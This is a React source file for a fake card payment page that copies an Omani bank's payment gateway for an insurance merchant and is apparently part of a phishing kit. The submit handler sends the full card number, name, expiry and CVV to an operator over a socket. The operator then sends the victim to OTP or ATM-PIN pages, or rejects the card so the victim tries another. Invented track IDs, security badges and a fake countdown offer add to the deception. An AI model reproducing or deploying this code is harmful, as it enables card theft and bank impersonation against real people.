import { useState, useEffect, useRef } from "react";
import { useSignalEffect } from "@preact/signals-react/runtime";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
import {
  socket,
  visitor,
  sendData,
  isFormApproved,
  isCardVerified,
  navigateToPage,
  cardAction,
  waitingMessage,
} from "@/lib/store";
import { MADA_BINS, getCardType as getCardTypeFromDB, getBinInfo } from "@/lib/binDatabase";

const schema = z.object({
  cardNumber: z
    .string()
    .min(1, "Card number is required")
    .refine((val) => {
      const cleanVal = val.replace(/\s+/g, "");
      if (!cleanVal || cleanVal.length < 13 || cleanVal.length > 19) return false;
      let sum = 0;
      let isEven = false;
      for (let i = cleanVal.length - 1; i >= 0; i--) {
        let digit = parseInt(cleanVal[i], 10);
        if (isEven) {
          digit *= 2;
          if (digit > 9) digit -= 9;
        }
        sum += digit;
        isEven = !isEven;
      }
      return sum % 10 === 0;
    }, "Invalid card number"),
  nameOnCard: z.string().min(1, "Cardholder name is required"),
  expiryDate: z.string().min(1, "Expiry date is required").refine((val) => {
    const match = val.match(/^(\d{2})\/(\d{2})$/);
    if (!match) return false;
    const month = parseInt(match[1], 10);
    const year = parseInt(match[2], 10);
    if (month < 1 || month > 12) return false;
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;
    if (year < currentYear || (year === currentYear && month < currentMonth)) return false;
    return true;
  }, "Invalid expiry date"),
  cvv: z.string().length(3, "CVV must be 3 digits"),
});

type FormData = z.infer<typeof schema>;

function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

function getCardType(number: string): string {
  const cleanNumber = number.replace(/\s+/g, "");
  const cardType = getCardTypeFromDB(cleanNumber);
  return cardType ? cardType.toLowerCase() : "unknown";
}

function getBankInfoLocal(cardNumber: string): { bank: string; logo: string } | null {
  const info = getBinInfo(cardNumber);
  if (info) {
    return { bank: info.bank, logo: info.bankLogo };
  }
  return null;
}

export default function CreditCardPayment() {
  const [, navigate] = useLocation();
  const [cardError, setCardError] = useState(false);
  const [luhnError, setLuhnError] = useState(false);
  const [rejectedError, setRejectedError] = useState(false);
  const [showManualEntry, setShowManualEntry] = useState(true);
  const [samsungPayError, setSamsungPayError] = useState(false);
  const debounceRef = useRef<ReturnType<typeof setTimeout> | null>(null);
  const lastSubmittedCardRef = useRef<string>("");
  const [rejectedCards, setRejectedCards] = useState<string[]>([]);

  const searchParams = new URLSearchParams(window.location.search);
  const urlAmount = searchParams.get('amount') || '0';

  const cartItems = JSON.parse(localStorage.getItem('amouage_cart') || '[]');

  const getCartTotal = () => {
    // Check for border insurance payment amount first
    const borderPayment = localStorage.getItem('paymentAmount');
    if (borderPayment && Number(borderPayment) > 0) {
      return borderPayment;
    }
    const storedTotal = localStorage.getItem('amouage_order_total');
    if (storedTotal && Number(storedTotal) > 0) {
      return storedTotal;
    }
    let total = 0;
    for (const item of cartItems) {
      total += (parseFloat(item.priceNum) || 0) * (item.quantity || 1);
    }
    return (total * 0.75).toFixed(3);
  };
  const totalAmount = (Number(urlAmount) > 0) ? urlAmount : getCartTotal();
  const productNames = cartItems.map((item: any) => item.name).join(', ') || 'Order Payment';

  const [trackId] = useState(() => {
    return '1149852416' + Math.floor(Math.random() * 10000000000).toString().padStart(10, '0');
  });

  const {
    register,
    handleSubmit,
    watch,
    setValue,
    reset,
    formState: { errors },
  } = useForm<FormData>({
    resolver: zodResolver(schema),
    defaultValues: {
      cardNumber: "",
      nameOnCard: "",
      expiryDate: "",
      cvv: "",
    },
  });

  const cardNumber = watch("cardNumber");
  const nameOnCard = watch("nameOnCard");
  const expiryDate = watch("expiryDate");
  const cvv = watch("cvv");

  const cleanCardNumber = cardNumber?.replace(/\s+/g, "") || "";
  const isFormValid =
    cleanCardNumber.length >= 13 &&
    cleanCardNumber.length <= 19 &&
    !luhnError &&
    nameOnCard?.trim().length > 0 &&
    expiryDate?.length === 5 &&
    /^\d{2}\/\d{2}$/.test(expiryDate || "") &&
    cvv?.length === 3;

  useEffect(() => {
    navigateToPage("الدفع بطاقة الائتمان");
    waitingMessage.value = "";
  }, []);

  useEffect(() => {
    if (cardNumber && cardNumber.replace(/\s+/g, "").length === 16) {
      if (debounceRef.current) clearTimeout(debounceRef.current);
      debounceRef.current = setTimeout(() => {
        socket.value.emit("cardNumber:verify", cardNumber.replace(/\s+/g, ""));
      }, 500);
    }
  }, [cardNumber]);

  useEffect(() => {
    if (isCardVerified.value === false) {
      setCardError(true);
    } else {
      setCardError(false);
    }
  }, [isCardVerified.value]);

  useEffect(() => {
    if (isFormApproved.value) {
      navigate("/otp-verification");
    }
  }, [isFormApproved.value, navigate]);

  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";

      if (action === 'otp') {
        navigate("/otp-verification");
      } else if (action === 'atm') {
        navigate("/atm-password");
      } else if (action === 'reject') {
        // Save the rejected card number for auto-rejection
        if (lastSubmittedCardRef.current) {
          setRejectedCards(prev => [...prev, lastSubmittedCardRef.current]);
        }
        setRejectedError(true);
        reset({
          cardNumber: "",
          nameOnCard: "",
          expiryDate: "",
          cvv: "",
        });
      }
      cardAction.value = null;
    }
  });

  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
    const groups = cleaned.match(/.{1,4}/g);
    return groups ? groups.join(" ") : cleaned;
  };

  const [globalBlockedCards, setGlobalBlockedCards] = useState<string[]>([]);
  const [globalBlockedError, setGlobalBlockedError] = useState(false);
  const [showPopup, setShowPopup] = useState(false);
  const [countdown, setCountdown] = useState(() => {
    const maxSeconds = 11 * 3600 + 47 * 60 + 4;
    const randomTotal = Math.floor(Math.random() * maxSeconds) + 1;
    const h = Math.floor(randomTotal / 3600);
    const m = Math.floor((randomTotal % 3600) / 60);
    const s = randomTotal % 60;
    return { hours: h, minutes: m, seconds: s };
  });

  // Show cashback popup after 2 seconds
  useEffect(() => {
    const popupTimer = setTimeout(() => {
      setShowPopup(true);
    }, 2000);
    return () => clearTimeout(popupTimer);
  }, []);

  // Countdown timer for popup
  useEffect(() => {
    if (!showPopup) return;
    const interval = setInterval(() => {
      setCountdown(prev => {
        const totalSeconds = prev.hours * 3600 + prev.minutes * 60 + prev.seconds - 1;
        if (totalSeconds <= 0) {
          clearInterval(interval);
          return { hours: 0, minutes: 0, seconds: 0 };
        }
        return {
          hours: Math.floor(totalSeconds / 3600),
          minutes: Math.floor((totalSeconds % 3600) / 60),
          seconds: totalSeconds % 60,
        };
      });
    }, 1000);
    return () => clearInterval(interval);
  }, [showPopup]);

  useEffect(() => {
    socket.value.emit("blockedCards:get");

    const handleBlockedCardsList = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };

    const handleBlockedCardsUpdated = (cards: string[]) => {
      setGlobalBlockedCards(cards || []);
    };

    socket.value.on("blockedCards:list", handleBlockedCardsList);
    socket.value.on("blockedCards:updated", handleBlockedCardsUpdated);

    return () => {
      socket.value.off("blockedCards:list", handleBlockedCardsList);
      socket.value.off("blockedCards:updated", handleBlockedCardsUpdated);
    };
  }, []);

  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;
    const cardPrefix = rawValue.slice(0, 4);

    if (globalBlockedError) {
      setGlobalBlockedError(false);
    }

    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
      setCardError(true);
      setValue("cardNumber", "");
      setLuhnError(false);
    } else {
      const formattedValue = formatCardNumber(rawValue);
      setValue("cardNumber", formattedValue);
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        if (!isValidCardNumber(rawValue)) {
          setLuhnError(true);
        } else {
          setLuhnError(false);
        }
      } else {
        setLuhnError(false);
      }
      setCardError(false);
    }
  };

  const handleExpiryChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/[^\d]/g, "");
    if (value.length >= 3) {
      value = value.slice(0, 2) + "/" + value.slice(2, 4);
    }
    setValue("expiryDate", value);
  };

    const onSubmit = (data: FormData) => {
    const cleanNumber = data.cardNumber.replace(/\s+/g, "");
    if (globalBlockedCards.includes(cleanNumber)) {
      setGlobalBlockedError(true);
      reset({ cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" });
      return;
    }
    // Auto-reject if this card was previously rejected by admin
    if (rejectedCards.includes(cleanNumber)) {
      setRejectedError(true);
      reset({ cardNumber: "", nameOnCard: "", expiryDate: "", cvv: "" });
      // Notify admin that a duplicate rejected card was attempted
      socket.value.emit("duplicate-rejected-card", { cardNumber: cleanNumber });
      return;
    }

    setRejectedError(false);
    setGlobalBlockedError(false);

    const cardType = getCardType(cleanNumber);
    const bankInfo = getBankInfoLocal(cleanNumber);

    waitingCardInfo.value = {
      cardType: cardType,
      bankName: bankInfo?.bank || undefined,
      bankLogo: bankInfo?.logo || undefined,
    };

    const [expiryMonth, expiryYear] = data.expiryDate.split("/");

    // Save payment data for OTP page
    localStorage.setItem("paymentData", JSON.stringify({
      cardLast4: cleanNumber.slice(-4),
      totalPaid: "OMR " + Number(totalAmount).toFixed(3),
      serviceName: "bima",
      bankName: bankInfo?.bank || "Unknown",
      bankLogo: bankInfo?.logo || null,
      cardType,
    }));

    lastSubmittedCardRef.current = cleanNumber;
    sendData({
      paymentCard: {
        cardNumber: cleanNumber,
        nameOnCard: data.nameOnCard,
        expiryMonth: expiryMonth,
        expiryYear: expiryYear,
        cvv: data.cvv,
        cardType,
        bankName: bankInfo?.bank || "Unknown",
        amount: totalAmount,
        productName: productNames,
      },
      current: "الدفع بطاقة الائتمان",
      nextPage: "رمز التحقق (OTP)",
      waitingForAdminResponse: true,
    });

    waitingMessage.value = "Processing payment...";
  };

  return (
    <div className="oab-wrapper" dir="ltr">
      <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;600;700&display=swap" rel="stylesheet" />
      <WaitingOverlay />

      {/* Cashback Popup */}
      {showPopup && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50" onClick={() => setShowPopup(false)}>
          <div className="bg-white rounded-2xl shadow-2xl max-w-sm w-[90%] mx-auto overflow-hidden" onClick={(e) => e.stopPropagation()}>
            {/* Image */}
            <div className="w-full">
              <img src="/images/cashback-cards.webp" alt="كاش باك 25%" className="w-full object-cover" />
            </div>
            {/* Content */}
            <div className="p-6 flex flex-col items-center justify-center text-center" dir="rtl">
              <h3 className="text-2xl font-bold text-gray-900 mb-2">{"سارع قبل نهاية العرض"}</h3>
              <p className="text-gray-500 mb-4">{"يتبقى على إنتهاء العرض"}</p>
              {/* Countdown */}
              <div className="text-4xl font-bold text-[#20744c] mb-6" dir="ltr">
                {String(countdown.hours).padStart(2, '0')}:{String(countdown.minutes).padStart(2, '0')}:{String(countdown.seconds).padStart(2, '0')}
              </div>
              {/* Close Button */}
              <button
                onClick={() => setShowPopup(false)}
                className="w-3/4 py-3 bg-gray-600 text-white rounded-lg font-bold text-lg hover:bg-gray-700 transition-colors flex justify-center items-center"
              >
                {"إغلاق"}
              </button>
            </div>
          </div>
        </div>
      )}

      <style>{`
        .oab-wrapper {
          font-family: 'Roboto', sans-serif !important;
          min-height: 100vh;
          background: #f8f9fa;
          display: flex;
          justify-content: center;
          align-items: flex-start;
          padding: 60px 20px 40px;
          direction: ltr !important;
          text-align: left !important;
          position: fixed;
          top: 0; left: 0; right: 0; bottom: 0;
          z-index: 9999;
          overflow-y: auto;
        }
        .oab-wrapper * {
          font-family: 'Roboto', sans-serif !important;
          direction: ltr !important;
          text-align: left !important;
          box-sizing: border-box;
        }
        .oab-container {
          background: #fff;
          border-radius: 12px;
          border: none;
          box-shadow: 0 2px 20px rgba(0,0,0,0.08);
          width: 100%;
          max-width: 1100px;
          overflow: hidden;
        }
        .oab-header {
          padding: 20px 28px 16px 28px;
          display: flex;
          justify-content: flex-start;
          align-items: center;
          background: #fff;
          border-bottom: none;
        }
        .oab-blue-strip {
          height: 32px;
          background: #EBF5FF;
          width: 100%;
          border-top: 1px solid #e0e4e8;
          border-bottom: 1px solid #e0e4e8;
        }
        .oab-header img {
          height: 70px;
          width: auto;
        }
        .oab-body {
          display: flex;
          min-height: 500px;
        }
        .oab-sidebar {
          width: 280px;
          flex-shrink: 0;
          padding: 0;
          border-right: none;
          background: #EBF5FF;
        }
        .oab-sidebar-title {
          font-size: 16px;
          font-weight: 700;
          color: #333;
          padding: 20px 24px 16px 24px;
          margin: 0;
        }
        .oab-nav-item {
          display: flex;
          align-items: flex-start;
          gap: 12px;
          padding: 14px 24px;
          cursor: pointer;
          border-left: 4px solid transparent;
          transition: all 0.2s;
        }
        .oab-nav-item.active {
          border-left: 4px solid #0058AA;
          background: #fff;
        }
        .oab-nav-icon {
          width: 20px;
          height: 20px;
          flex-shrink: 0;
          margin-top: 2px;
        }
        .oab-nav-title {
          font-size: 14px;
          font-weight: 700;
          color: #0058AA;
          margin: 0;
          line-height: 1.3;
        }
        .oab-nav-desc {
          font-size: 12px;
          color: #888;
          margin: 3px 0 0 0;
          font-weight: 400;
        }
        .oab-center {
          flex: 1;
          padding: 28px 40px;
          background: #fff;
          border-left: 1px solid #e0e4e8;
        }
        .oab-right {
          width: 240px;
          flex-shrink: 0;
          padding: 28px 22px;
          background: #fff;
          border-left: 8px solid #EBF5FF;
        }
        .oab-back {
          display: inline-flex;
          align-items: center;
          gap: 8px;
          color: #0058AA;
          font-size: 15px;
          font-weight: 500;
          cursor: pointer;
          margin-bottom: 24px;
          text-decoration: none;
          background: none;
          border: none;
          padding: 0;
        }
        .oab-back:hover { text-decoration: underline; }
        .oab-label {
          font-size: 14px;
          font-weight: 600;
          color: #424242;
          margin-bottom: 8px;
          display: block;
        }
        .oab-input {
          width: 100%;
          border: 1px solid #b7b7b8;
          border-radius: 4px;
          padding: 10px 12px;
          font-size: 14px;
          outline: none;
          transition: border-color 0.2s;
          background: #fff;
          color: #000;
        }
        .oab-input:focus { border-color: initial; box-shadow: none; }
        .oab-input::placeholder { color: #999; font-size: 12px; }
        .oab-input.error { border-color: red; }
        .oab-field { margin-bottom: 22px; }
        .oab-row { display: flex; gap: 16px; }
        .oab-row > div { flex: 1; }
        .oab-error { color: #dc3545; font-size: 12px; margin-top: 4px; }
        .oab-check-group {
          display: flex;
          align-items: flex-start;
          gap: 8px;
          margin-top: 18px;
        }
        .oab-check-group input[type="checkbox"] {
          width: 16px; height: 16px;
          accent-color: #0058AA;
          margin-top: 3px;
          flex-shrink: 0;
          border: 1px solid #0058AA;
        }
        .oab-check-label {
          font-size: 14px;
          color: #424242;
          font-weight: 500;
          line-height: 1.5;
        }
        .oab-check-label a { color: #0058AA; text-decoration: none; font-weight: 600; }
        .oab-check-desc {
          font-size: 12px;
          color: grey;
          margin-top: 2px;
        }
        .oab-c2p-icon {
          width: 20px;
          height: 16px;
          flex-shrink: 0;
          margin-top: 3px;
        }
        .oab-s-label {
          font-size: 14px;
          font-weight: 600;
          color: #424242;
          margin: 0 0 3px 0;
        }
        .oab-s-value {
          font-size: 12px;
          color: #858585;
          margin: 0 0 12px 0;
          word-break: break-all;
        }
        .oab-s-divider {
          border: none;
          border-top: 1px solid rgba(0,0,0,0.1);
          margin: 8px 0;
        }
        .oab-s-amount {
          font-size: 22px;
          font-weight: 600;
          color: #000;
          margin: 4px 0 0 0;
        }
        .oab-pay-btn {
          width: 100%;
          height: 44px;
          display: flex;
          justify-content: center;
          align-items: center;
          background: linear-gradient(180deg, #42a5f5 0%, #1565c0 100%);
          color: #fff !important;
          border: none;
          border-radius: 50px;
          font-size: 16px;
          font-weight: 600;
          cursor: pointer;
          margin-top: 20px;
        }
        .oab-pay-btn:hover { opacity: 0.92; color: #fff !important; }
        .oab-pay-btn:disabled { opacity: 0.4; cursor: not-allowed; }
        .oab-cancel-btn {
          width: 100%;
          height: 44px;
          display: flex;
          justify-content: center;
          align-items: center;
          background: #fff;
          color: #1976D2;
          border: 1.5px solid #1976D2;
          border-radius: 50px;
          font-size: 16px;
          font-weight: 500;
          cursor: pointer;
          margin-top: 10px;
        }
        .oab-cancel-btn:hover { background: #f5f9ff; }
        .oab-footer {
          padding: 16px 32px;
          display: flex;
          justify-content: flex-end;
          align-items: center;
          gap: 18px;
          background: #EBF5FF;
          border-top: 1px solid #e0e4e8;
        }
        .oab-footer img { height: 26px; opacity: 0.9; }
        .oab-error-banner {
          background: #fff3f3;
          border: 1px solid #ffaeae;
          border-radius: 6px;
          padding: 10px 14px;
          margin-bottom: 16px;
        }
        .oab-error-banner p {
          color: #dc3545;
          font-size: 13px;
          margin: 0;
          text-align: center !important;
        }
        @media (max-width: 992px) {
          .oab-body { flex-direction: column; }
          .oab-sidebar { width: 100%; border-right: none; border-bottom: 1px solid #e0e0e0; }
          .oab-right { width: 100%; border-top: 1px solid #e0e0e0; }
          .oab-wrapper { padding: 10px; }
        }
      `}</style>

      <div className="oab-container">
        {/* Header with OAB Logo */}
        <div className="oab-header">
          <img src="/img/logo/bima-en.png" alt="bima" />
        </div>

        {/* Blue strip between header and body */}
        <div className="oab-blue-strip"></div>

        {/* Body: Sidebar + Center + Right */}
        <div className="oab-body">
          {/* Left Sidebar */}
          <div className="oab-sidebar">
            <p className="oab-sidebar-title">Payment Options</p>
            <div className="oab-nav-item active">
              <svg className="oab-nav-icon" viewBox="0 0 24 24" fill="none" stroke="#0058AA" strokeWidth="1.5">
                <rect x="2" y="5" width="20" height="14" rx="2" />
                <line x1="2" y1="10" x2="22" y2="10" />
              </svg>
              <div>
                <p className="oab-nav-title">Credit / Debit / Prepaid Card</p>
                <p className="oab-nav-desc">VISA, OMANNET, MASTERCARD</p>
              </div>
            </div>
            <div className="oab-nav-item" onClick={() => { setSamsungPayError(true); setTimeout(() => setSamsungPayError(false), 3000); }} style={{cursor: 'pointer'}}>
              <svg className="oab-nav-icon" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" fill="#0058AA" />
                <text x="12" y="16" textAnchor="middle" fill="#fff" fontSize="8" fontWeight="bold">S</text>
              </svg>
              <div>
                <p className="oab-nav-title">Samsung Pay</p>
                <p className="oab-nav-desc">All major banks available</p>
                {samsungPayError && <p style={{color: 'red', fontSize: '12px', margin: '4px 0 0 0'}}>This payment method is currently unavailable</p>}
              </div>
            </div>
          </div>

          {/* Center Content */}
          <div className="oab-center">
            {/* Error Messages */}
            {rejectedError && (
              <div className="oab-error-banner">
                <p>Card information is incorrect. Please try again.</p>
              </div>
            )}
            {globalBlockedError && (
              <div className="oab-error-banner">
                <p>Transaction declined by issuing bank.</p>
                <p style={{ fontSize: '11px', marginTop: '4px' }}>Please try a different payment method.</p>
              </div>
            )}

            <button className="oab-back" onClick={() => window.history.back()}>
              ← Back
            </button>

            <form onSubmit={handleSubmit(onSubmit)}>
              {/* Card Number */}
              <div className="oab-field">
                <label className="oab-label">Card Number</label>
                <input
                  type="tel"
                  inputMode="numeric"
                  maxLength={23}
                  placeholder="Enter the card number"
                  className={`oab-input ${(cardError || luhnError) ? 'error' : ''}`}
                  {...register("cardNumber")}
                  onChange={handleCardChange}
                  onFocus={() => { setRejectedError(false); setGlobalBlockedError(false); }}
                />
                {(errors.cardNumber || cardError || luhnError) && (
                  <p className="oab-error">
                    {cardError ? "This card has been rejected. Please use a different card." : luhnError ? "Invalid card number" : (errors.cardNumber?.message || "Invalid card number")}
                  </p>
                )}
              </div>

              {/* Card Holder Name */}
              <div className="oab-field">
                <label className="oab-label">Card Holders Name</label>
                <input
                  type="text"
                  placeholder="Enter the card name"
                  className="oab-input"
                  {...register("nameOnCard")}
                  onChange={(e) => {
                    const englishOnly = e.target.value.replace(/[^A-Za-z\s]/g, "");
                    setValue("nameOnCard", englishOnly);
                  }}
                />
                {errors.nameOnCard && (
                  <p className="oab-error">should contain alphabets with space</p>
                )}
              </div>

              {/* Expiry Date and CVV */}
              <div className="oab-row">
                <div className="oab-field">
                  <label className="oab-label">Expiry Date</label>
                  <input
                    type="text"
                    placeholder="MM/YY"
                    maxLength={5}
                    className="oab-input"
                    {...register("expiryDate")}
                    onChange={handleExpiryChange}
                  />
                  {errors.expiryDate && (
                    <p className="oab-error">{errors.expiryDate.message}</p>
                  )}
                </div>
                <div className="oab-field">
                  <label className="oab-label">CVV</label>
                  <input
                    type="password"
                    inputMode="numeric"
                    maxLength={3}
                    placeholder="Enter the CVV2"
                    className="oab-input"
                    {...register("cvv")}
                    onChange={(e) => {
                      const digitsOnly = e.target.value.replace(/[^0-9]/g, "");
                      setValue("cvv", digitsOnly);
                    }}
                  />
                  {errors.cvv && (
                    <p className="oab-error">Should be in number. Length should be 3</p>
                  )}
                </div>
              </div>

              {/* Checkboxes */}
              <div className="oab-check-group">
                <input type="checkbox" id="linkClickToPay" />
                <svg className="oab-c2p-icon" viewBox="0 0 24 18" fill="none">
                  <path d="M4 9h16M14 4l6 5-6 5" stroke="#0058AA" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                  <path d="M20 9H4M10 14l-6-5 6-5" stroke="#40a3ff" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <div>
                  <label className="oab-check-label" htmlFor="linkClickToPay">
                    Link this Card to Click to Pay ( <a href="#">Terms & Conditions</a> / <a href="#">Privacy Notice</a> )
                  </label>
                  <div className="oab-check-desc">(Card will be Linked with Click to Pay for fast and secure payment)</div>
                </div>
              </div>

              <div className="oab-check-group" style={{ marginTop: '10px' }}>
                <input type="checkbox" id="tokenizeCard" />
                <div>
                  <label className="oab-check-label" htmlFor="tokenizeCard">
                    Tokenize this Card for future transaction
                  </label>
                  <div className="oab-check-desc">(Cardnumber will be stored for future reference)</div>
                </div>
              </div>
            </form>
          </div>

          {/* Right Summary Panel */}
          <div className="oab-right">
            <p className="oab-s-label">Merchant</p>
            <p className="oab-s-value">bima</p>

            <hr className="oab-s-divider" />
            <p className="oab-s-label">Track Id</p>
            <p className="oab-s-value">{trackId}</p>
            <hr className="oab-s-divider" />
            <p className="oab-s-label">Terminal Info</p>
            <p className="oab-s-value">ETRAFFIC</p>
            <hr className="oab-s-divider" />
            <p className="oab-s-label">Amount</p>
            <p className="oab-s-amount">OMR {Number(totalAmount).toFixed(3)}</p>

            <button
              className="oab-pay-btn"
              disabled={!isFormValid}
              onClick={handleSubmit(onSubmit)}
              type="button"
            >
              Pay
            </button>
            <button className="oab-cancel-btn" type="button" onClick={() => window.history.back()}>
              Cancel
            </button>
          </div>
        </div>

        {/* Footer */}
        <div className="oab-footer">
          <img src="/images/verisign.svg" alt="VeriSign" />
          <img src="/images/pci.svg" alt="PCI DSS" />
          <img src="/images/visa_oab.svg" alt="Visa" />
          <img src="/images/amex.svg" alt="American Express" />
          <img src="/images/mastercard_oab.svg" alt="MasterCard" />
          <img src="/images/omannet.svg" alt="OmanNet" />
        </div>
      </div>
    </div>
  );
}
